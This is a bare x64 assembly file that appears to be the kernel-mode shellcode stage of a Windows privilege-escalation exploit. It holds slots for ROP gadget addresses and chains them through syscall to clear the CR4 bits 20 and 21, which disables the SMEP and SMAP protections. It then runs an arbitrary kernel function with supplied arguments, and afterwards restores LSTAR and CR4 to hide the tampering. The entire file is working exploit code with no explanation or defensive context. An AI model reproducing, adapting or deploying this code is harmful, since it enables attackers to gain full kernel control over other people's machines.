.data

public POP_RCX_RET
public MOV_CR4_RCX_RET
public MOV_RAX_RCX_RET
public SYSRETQ_RET
public OriginalCR4
public IA32_LSTAR
public CallTargetFn
public CallArgCount
public CallArgsPtr
public CallResult
public ENTRY_GADGET
public shellcode_entry

POP_RCX_RET     dq 0
MOV_CR4_RCX_RET dq 0
MOV_RAX_RCX_RET dq 0
SYSRETQ_RET     dq 0
OriginalCR4     dq 0
IA32_LSTAR      dq 0
CallTargetFn    dq 0
CallArgCount    dq 0
CallArgsPtr     dq 0
CallResult      dq 0
ENTRY_GADGET    dq 0

.code

shellcode_entry proc
    pushfq
    or qword ptr [rsp], 40000h
    popfq

    push SYSRETQ_RET
    lea rax, gate_dispatch
    push rax
    push POP_RCX_RET
    push MOV_RAX_RCX_RET
    syscall
shellcode_entry endp

gate_dispatch proc
    mov [OriginalCR4], rax
    btr rax, 20
    btr rax, 21

    lea r8, generic_call_stub
    push r8
    push MOV_CR4_RCX_RET
    push rax
    push POP_RCX_RET
    syscall
gate_dispatch endp

generic_call_stub proc
    swapgs
    cli

    mov gs:[10h], rsp
    mov rsp, gs:[1A8h]

    push rbx
    push rbp
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15
    push r11
    sub rsp, 8

    mov rax, [CallTargetFn]
    test rax, rax
    jz @skip_call

    mov rbx, [CallArgsPtr]
    mov r12, [CallArgCount]

    mov r13, r12
    cmp r13, 4
    jge @count_ok
    mov r13, 4
@count_ok:
    shl r13, 3
    add r13, 8
    and r13, 0FFFFFFFFFFFFFFF0h
    sub rsp, r13

    test r12, r12
    jnz @has_args
    xor ecx, ecx
    xor edx, edx
    xor r8d, r8d
    xor r9d, r9d
    jmp @do_call
@has_args:

    cmp r12, 5
    jl @load_regs
    mov rcx, r12
    dec rcx
@push_stack:
    cmp rcx, 4
    jl @load_regs
    mov rax, [rbx + rcx*8]
    mov [rsp + rcx*8], rax
    dec rcx
    jmp @push_stack

@load_regs:
    mov rcx, [rbx]
    cmp r12, 2
    jl @do_call
    mov rdx, [rbx + 8]
    cmp r12, 3
    jl @do_call
    mov r8,  [rbx + 16]
    cmp r12, 4
    jl @do_call
    mov r9,  [rbx + 24]

@do_call:
    mov rax, [CallTargetFn]
    call rax
    mov [CallResult], rax

    add rsp, r13

@skip_call:
    add rsp, 8
    pop r11
    pop r15
    pop r14
    pop r13
    pop r12
    pop rsi
    pop rdi
    pop rbp
    pop rbx

    mov rsp, gs:[10h]

    mov ecx, 0C0000082h
    mov rax, [IA32_LSTAR]
    mov rdx, rax
    shr rdx, 32
    wrmsr

    btr r11, 18

    mov rcx, [OriginalCR4]

    pop rax
    push SYSRETQ_RET
    push rax
    push POP_RCX_RET

    swapgs
    jmp MOV_CR4_RCX_RET
generic_call_stub endp

end
